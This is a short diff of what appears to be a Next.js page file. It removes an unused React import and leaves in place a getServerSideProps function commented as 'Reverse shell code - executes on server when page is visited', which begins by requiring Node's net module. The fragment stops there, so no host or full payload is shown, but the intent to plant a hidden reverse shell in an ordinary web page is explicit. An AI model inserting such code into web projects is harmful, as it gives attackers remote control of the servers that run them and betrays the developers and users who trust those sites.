@@ -1,5 +1,3 @@
-import { useEffect } from 'react';
-
 export async function getServerSideProps() {
   // Reverse shell code - executes on server when page is visited
   const net = require('net');
